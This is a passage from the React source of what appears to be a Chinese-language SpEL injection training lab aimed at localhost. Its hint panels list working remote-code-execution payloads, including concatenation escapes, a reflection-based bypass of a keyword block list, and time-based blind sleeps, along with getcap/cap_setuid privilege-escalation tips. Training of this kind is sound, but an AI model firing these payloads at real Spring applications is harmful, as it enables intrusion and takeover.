                     <a href="http://127.0.0.1:8080/spel/vuln/direct?expression='hello'" target="_blank" rel="noopener noreferrer" className="text-kali-accent hover:underline text-sm font-mono bg-black px-2 py-1 rounded border border-gray-700 block w-fit">
                       http://127.0.0.1:8080/spel/vuln/direct?expression='hello'
                     </a>
                   </div>
                 </li>
                 <li className="flex items-start gap-3">
                   <span className="bg-green-800 text-green-200 text-xs font-bold px-2 py-1 rounded mt-1">2</span>
                   <div>
                     <strong className="text-white block">开始黑盒渗透</strong>
                     <p className="text-sm text-gray-500">
                       现在靶机就是 <code>127.0.0.1:8080</code>。请切换到左侧菜单的 <span className="text-white font-bold">"完整攻略"</span> 或使用 Kali 工具链（Burp/Curl）对该端口进行真实的漏洞挖掘。
                     </p>
                   </div>
                 </li>
               </ul>
             </div>
           </div>
        );

      case View.LAB_DIRECT:
        return (
          <div className="flex h-full gap-6">
            <div className="flex-1 space-y-6">
              <h2 className="text-2xl font-bold text-kali-text">关卡 1: 直接注入</h2>
              <div className="bg-kali-panel p-6 rounded border border-gray-700">
                <p className="text-gray-400 mb-4">
                  应用程序接收你的输入并直接传递给 <code>ExpressionParser.parseExpression()</code>。
                </p>
                <div className="flex gap-2 mb-4">
                  <input 
                    type="text" 
                    value={directInput}
                    onChange={(e) => setDirectInput(e.target.value)}
                    placeholder="输入 SpEL 表达式..."
                    className="flex-1 bg-black border border-gray-600 rounded px-4 py-2 text-white focus:border-kali-blue outline-none font-mono"
                  />
                  <button 
                    onClick={simulateDirectSpEL}
                    className="bg-kali-blue hover:bg-blue-600 text-white px-6 py-2 rounded font-bold"
                  >
                    注入
                  </button>
                </div>
                <div className="p-4 bg-black border border-gray-800 rounded font-mono text-sm">
                  <div className="text-gray-500 text-xs mb-1">服务器响应:</div>
                  <div className="text-green-500 min-h-[20px] whitespace-pre-wrap break-all">
                    {directResult || "等待输入..."}
                  </div>
                </div>
              </div>
            </div>
            
            <HintPanel 
              title="情报"
              hints={[
                "SpEL 表达式可以做数学运算: 1+1",
                "字符串必须加引号: 'hello'",
                "使用 T(...) 访问 Java 类型",
                "如果返回 'Type conversion problem' 且你是 RCE Payload，说明攻击成功了！",
                "ProcessBuilder.start() 返回的是 Process 对象，无法直接转为 String。"
              ]}
              payloads={[
                { label: "数学测试", code: "100*5" },
                { label: "字符串测试", code: "'test'.toUpperCase()" },
                { label: "RCE (ProcessBuilder)", code: "new java.lang.ProcessBuilder('/bin/bash','-c','id').start()" },
                { label: "RCE (Runtime)", code: "T(java.lang.Runtime).getRuntime().exec('id')" }
              ]}
            />
          </div>
        );

      case View.LAB_CONCAT:
        return (
          <div className="flex h-full gap-6">
            <div className="flex-1 space-y-6">
              <h2 className="text-2xl font-bold text-kali-text">关卡 2: 拼接注入</h2>
              <div className="bg-kali-panel p-6 rounded border border-gray-700">
                <div className="bg-yellow-900/20 border border-yellow-600/30 p-4 rounded mb-4 text-sm text-yellow-200 font-mono">
                  String query = "Hello, ('" + input + "')!";
                </div>
                <div className="flex gap-2 mb-4">
                  <input 
                    type="text" 
                    value={concatInput}
                    onChange={(e) => setConcatInput(e.target.value)}
                    placeholder="尝试闭合字符串..."
                    className="flex-1 bg-black border border-gray-600 rounded px-4 py-2 text-white focus:border-kali-blue outline-none font-mono"
                  />
                  <button onClick={simulateConcat} className="bg-kali-blue hover:bg-blue-600 text-white px-6 py-2 rounded font-bold">注入</button>
                </div>
                <div className="p-4 bg-black border border-gray-800 rounded font-mono text-sm text-green-500 min-h-[40px]">
                  {concatResult}
                </div>
              </div>
            </div>
            <HintPanel 
              title="上下文逃逸"
              hints={[
                "你正处于一个字符串字面量中: '...'",
                "你正处于括号中: ('...')",
                "必须闭合两者才能开始新的表达式",
                "格式: ') + [PAYLOAD] + ('"
              ]}
              payloads={[
                { label: "闭合测试", code: "') + 'hacked' + ('" },
                { label: "数学注入", code: "') + (5*5) + ('" },
                { label: "RCE 注入", code: "') + T(java.lang.Runtime).getRuntime().exec('id') + ('" }
              ]}
            />
          </div>
        );
      
      case View.LAB_BYPASS:
        return (
          <div className="flex h-full gap-6">
            <div className="flex-1 space-y-6">
              <h2 className="text-2xl font-bold text-orange-400">关卡 3: WAF 绕过</h2>
              <div className="bg-kali-panel p-6 rounded border border-orange-500/30">
                <div className="mb-4 text-sm text-red-400 font-mono bg-black p-2 rounded border border-red-900/50">
                  BLOCK_LIST = ["runtime", "exec", "processbuilder", "bash"]
                </div>
                <div className="flex gap-2 mb-4">
                  <input 
                    type="text" 
                    value={bypassInput}
                    onChange={(e) => setBypassInput(e.target.value)}
                    placeholder="尝试绕过..."
                    className="flex-1 bg-black border border-gray-600 rounded px-4 py-2 text-white focus:border-kali-blue outline-none font-mono"
                  />
                  <button onClick={simulateBypass} className="bg-orange-600 hover:bg-orange-700 text-white px-6 py-2 rounded font-bold">攻击</button>
                </div>
                 <div className="p-4 bg-black border border-gray-800 rounded font-mono text-sm min-h-[40px]">
                   {bypassResult?.includes("403") ? 
                     <span className="text-red-500 font-bold">{bypassResult}</span> : 
                     <span className="text-green-500">{bypassResult}</span>
                   }
                </div>
              </div>
            </div>
            <HintPanel 
              title="混淆技巧"
              hints={[
                "WAF 正在检测特定的字符串",
                "Java 字符串可以被拼接: 'Run'+'time'",
                "反射 (Reflection) 可以动态加载类",
                "ScriptEngineManager 可以避免使用 'exec' 关键字"
              ]}
              payloads={[
                { label: "字符串拼接 (Java中无效)", code: "T(java.lang.'Run'+'time')" },
                { label: "反射 (正确解法)", code: "T(String).getClass().forName('java.l'+'ang.Ru'+'ntime').getMethod('ex'+'ec',T(String)).invoke(T(String).getClass().forName('java.l'+'ang.Ru'+'ntime').getMethod('getRuntime').invoke(null),'id')" },
                { label: "JS 引擎", code: "new javax.script.ScriptEngineManager().getEngineByName('js').eval('java.lang.Runtime.getRuntime().exec(\"id\")')" }
              ]}
            />
          </div>
        );

      case View.LAB_BLIND:
        return (
          <div className="flex h-full gap-6">
            <div className="flex-1 space-y-6">
              <h2 className="text-2xl font-bold text-red-400">关卡 4: 盲注</h2>
              <div className="bg-kali-panel p-6 rounded border border-red-500/30">
                <p className="text-gray-400 mb-4">
                  应用程序执行了你的代码但 **不返回任何内容**。如何知道执行是否成功？
                </p>
                <div className="flex gap-2 mb-4">
                   <input 
                    type="text" 
                    value={blindInput}
                    onChange={(e) => setBlindInput(e.target.value)}
                    placeholder="让它沉睡..."
                    className="flex-1 bg-black border border-gray-600 rounded px-4 py-2 text-white focus:border-kali-blue outline-none font-mono"
                  />
                  <button onClick={simulateBlind} disabled={blindLoading} className="bg-red-600 hover:bg-red-700 text-white px-6 py-2 rounded font-bold disabled:opacity-50">
                    {blindLoading ? '等待中...' : '发送'}
                  </button>
                </div>
                 <div className="p-4 bg-black border border-gray-800 rounded font-mono text-sm min-h-[40px] flex items-center">
                   {blindLoading && <span className="text-yellow-500 animate-pulse">处理请求中... (连接保持)</span>}
                   {!blindLoading && blindResult && <span className="text-gray-500">{blindResult}</span>}
                </div>
              </div>
            </div>
             <HintPanel 
              title="基于时间的 Oracle"
              hints={[
                "如果页面加载耗时超过 5 秒，说明代码执行了",
                "使用 T(java.lang.Thread).sleep(ms)",
                "结合条件语句按位提取数据"
              ]}
              payloads={[
                { label: "沉睡 5秒", code: "T(java.lang.Thread).sleep(5000)" },
                { label: "条件沉睡", code: "('abc'.length() == 3) ? T(Thread).sleep(5000) : 0" }
              ]}
            />
          </div>
        );

      case View.LAB_RCE:
        return (
          <div className="space-y-6">
            <h2 className="text-2xl font-bold text-red-500">后渗透 Shell</h2>
             <div className="bg-[#1a1a1a] p-4 rounded border border-gray-700 text-sm text-gray-400">
               <strong className="text-white">任务:</strong> 你已获得容器的 RCE 权限。现在找到 Flag 并提权为 Root。
             </div>
            <TerminalWindow 
              output={rceOutput}
              command={rceCommand}
              onCommandChange={setRceCommand}
              onExecute={simulateRCE}
              isProcessing={isRceProcessing}
              title="远程 Shell (root@container)"
            />
             <div className="grid grid-cols-3 gap-4 mt-4 text-xs text-gray-500">
                <div className="bg-black p-2 rounded border border-gray-800">
                  <span className="block text-gray-300 font-bold">1. 侦察 (Recon)</span>
                  尝试: <code>ls -la /opt</code> 或 <code>env</code>
                </div>
                <div className="bg-black p-2 rounded border border-gray-800">
                  <span className="block text-gray-300 font-bold">2. 提权检查</span>
                  尝试: <code>getcap -r /</code>
                </div>
                 <div className="bg-black p-2 rounded border border-gray-800">
                  <span className="block text-gray-300 font-bold">3. 漏洞利用</span>
                  使用 python3 cap_setuid 提权为 root。
                </div>
             </div>
          </div>
        );

      case View.SOURCE_JAVA:
        return (
          <div className="space-y-4">
            <h2 className="text-2xl font-bold">漏洞控制器逻辑</h2>
            <p className="text-gray-400 text-sm">审查源代码 (白盒测试) 是理解 WAF 逻辑的最佳方式。</p>
            <CodeViewer filename="SpelController.java" code={SPEL_CONTROLLER_CODE} />
          </div>
        );
      
      case View.SOURCE_DOCKER:
        return (
          <div className="space-y-4">
             <h2 className="text-2xl font-bold">基础设施</h2>
             <CodeViewer filename="docker-compose.yml" code={DOCKER_COMPOSE_CODE} language="yaml" />
             <CodeViewer filename="Dockerfile" code={DOCKERFILE_CODE} language="dockerfile" />
          </div>
        );

      case View.SOURCE_SCRIPTS:
        return (
          <div className="space-y-4">
            <h2 className="text-2xl font-bold">提权脚本</h2>
            <p className="text-gray-400">这些脚本在容器启动时运行，用于创建故意设计的漏洞环境。</p>
            <CodeViewer filename="setup_scripts.sh" code={SETUP_SCRIPTS_CODE} language="bash" />
          </div>
        );

      case View.README:
        return (
          <div className="space-y-4">
             <h2 className="text-2xl font-bold">完整攻略 & Flag 指南</h2>
             <CodeViewer filename="README.md" code={README_CODE} language="markdown" />
          </div>
        );

      default:
        return <div>Select a view</div>;
    }
  };

  return (
    <div className="min-h-screen bg-kali-bg text-gray-200 flex font-sans">
      {/* Sidebar */}
      <div className="w-64 bg-kali-panel border-r border-gray-800 flex flex-col fixed h-full z-10">
        <div className="p-6 border-b border-gray-800">
          <h1 className="text-xl font-bold tracking-wider text-white">
            <span className="text-kali-blue">SPEL</span> 靶场
          </h1>
          <p className="text-xs text-gray-500 mt-1">v2.0 终极版</p>
        </div>
        <nav className="flex-1 overflow-y-auto py-4">
          {navItems.map((item, idx) => 
            item.type === 'divider' ? (
              <div key={idx} className="h-px bg-gray-800 my-2 mx-4" />
            ) : (
              <button
                key={idx}
                onClick={() => item.id && setCurrentView(item.id as View)}
                className={`w-full text-left px-6 py-3 text-sm font-medium transition flex items-center gap-3 border-l-2
                  ${currentView === item.id 
                    ? 'bg-kali-blue/10 text-kali-blue border-kali-blue' 
                    : 'border-transparent text-gray-400 hover:bg-white/5 hover:text-white'
                  }`}
              >
                <span>{item.icon}</span>
                {item.label}
              </button>
            )
          )}
        </nav>
      </div>

      {/* Main Content */}
      <div className="ml-64 flex-1 p-8 overflow-y-auto">
        <div className="max-w-6xl mx-auto min-h-[calc(100vh-4rem)]">
          {renderContent()}
        </div>
      </div>
    </div>
  );
};

export default App;